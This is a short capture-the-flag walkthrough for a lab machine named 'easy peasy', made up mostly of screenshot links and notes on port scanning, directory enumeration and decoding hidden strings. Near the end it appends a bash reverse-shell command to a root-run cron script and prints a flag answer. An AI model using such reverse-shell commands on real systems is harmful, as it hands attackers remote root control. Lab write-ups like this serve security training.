# easy peasy walkthrough
# task 1
![image](https://user-images.githubusercontent.com/60177793/93796942-31710200-fc59-11ea-8c29-1f5e229efcf6.png)
###### So we have a number of ports open:
###### Port 80: Open Http — Website
###### Port 6498: SSH
###### Port 65524: Open HTTP — Website
![image](https://user-images.githubusercontent.com/60177793/93797018-4cdc0d00-fc59-11ea-9873-a2eacb2ba5be.png)
![image](https://user-images.githubusercontent.com/60177793/93797169-814fc900-fc59-11ea-8386-4cdcde798d0d.png)
![image](https://user-images.githubusercontent.com/60177793/93797203-8f054e80-fc59-11ea-8c37-68a2b7d1b337.png)
![image](https://user-images.githubusercontent.com/60177793/93796904-24eca980-fc59-11ea-8f0d-21da2bd95f1d.png)

# task 2 
###### now we will use gobuster to enumerate the machine
![image](https://user-images.githubusercontent.com/60177793/93797517-fae7b700-fc59-11ea-9c22-7a560379ddb9.png)
###### The directory /hidden takes us to a screen shot, checking the source there appears to be nothing of interest.
![image](https://user-images.githubusercontent.com/60177793/93797991-924d0a00-fc5a-11ea-8d71-71b68351c963.png)
![image](https://user-images.githubusercontent.com/60177793/93797842-629e0200-fc5a-11ea-907f-8d98d257ff0c.png)
![image](https://user-images.githubusercontent.com/60177793/93798147-d4764b80-fc5a-11ea-87e1-e9082cc2a975.png)
![image](https://user-images.githubusercontent.com/60177793/93798199-ea840c00-fc5a-11ea-8735-69878ab41750.png)

###### Moving on to enumerate Port 65524:
###### This opens up into the standard Apache 2 welcome screen; however, checking to see whether there is a robots.txt, we see the following:

![image](https://user-images.githubusercontent.com/60177793/93798486-61b9a000-fc5b-11ea-9d5c-67c3d317440a.png)
![image](https://user-images.githubusercontent.com/60177793/93798606-96c5f280-fc5b-11ea-9b99-61c50abaea2f.png)
![image](https://user-images.githubusercontent.com/60177793/93798625-9ded0080-fc5b-11ea-9954-6c5902a10a06.png)
###### Back to the Apache 2 website, I inspected the source and found flag 3.
![image](https://user-images.githubusercontent.com/60177793/93798705-ba893880-fc5b-11ea-893c-e9e80bdfdf67.png)
###### Further enumeration of the source code identified the following:
![image](https://user-images.githubusercontent.com/60177793/93798878-fc19e380-fc5b-11ea-95f7-450ab601270d.png)

![image](https://user-images.githubusercontent.com/60177793/93798941-10f67700-fc5c-11ea-99f9-81d884971907.png)

###### The decode looked very much like a directory and this worked, taking me to page:

![image](https://user-images.githubusercontent.com/60177793/93799119-531fb880-fc5c-11ea-8f63-140795719f06.png)
![image](https://user-images.githubusercontent.com/60177793/93799353-abef5100-fc5c-11ea-95d3-b49348209982.png)

![image](https://user-images.githubusercontent.com/60177793/93799271-8f531900-fc5c-11ea-802b-f52d25254895.png)
![image](https://user-images.githubusercontent.com/60177793/93799204-764a6800-fc5c-11ea-916a-29a44a9092a8.png)
![image](https://user-images.githubusercontent.com/60177793/93799672-17d1b980-fc5d-11ea-9605-19df12f5a563.png)
![image](https://user-images.githubusercontent.com/60177793/93799933-7ac35080-fc5d-11ea-8041-45cd4780a0fb.png)

![image](https://user-images.githubusercontent.com/60177793/93799893-6b440780-fc5d-11ea-8060-43deed732cfb.png)
###### There is an interesting cron job being run .mysecretcronjob.sh every minute. We can see that it is being run by root.
##### ets append a shell to this file
##### echo ‘bash -i >& /dev/tcp/IP/PORT 0>&1’ >> /var/www/.mysecretcronjob.sh
##### flag :  flag{63a9f0ea7bb98050796b649e85481845}
![image](https://user-images.githubusercontent.com/60177793/93800560-63389780-fc5e-11ea-9b39-123892d5f05e.png)




